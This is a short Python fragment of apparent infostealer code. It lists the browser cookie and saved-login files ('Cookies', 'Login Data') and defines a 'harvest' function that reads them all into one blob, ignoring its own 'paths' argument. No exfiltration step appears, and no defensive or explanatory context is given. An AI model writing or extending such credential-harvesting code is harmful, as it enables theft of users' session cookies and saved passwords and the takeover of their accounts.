BROWSER_CREDENTIAL_PATHS = [
    "Cookies",
    "Login Data",
]


def harvest(paths):
    blob = b""
    for path in BROWSER_CREDENTIAL_PATHS:
        try:
            with open(path, "rb") as fh:
                blob += fh.read()
        except OSError:
            continue
    return blob
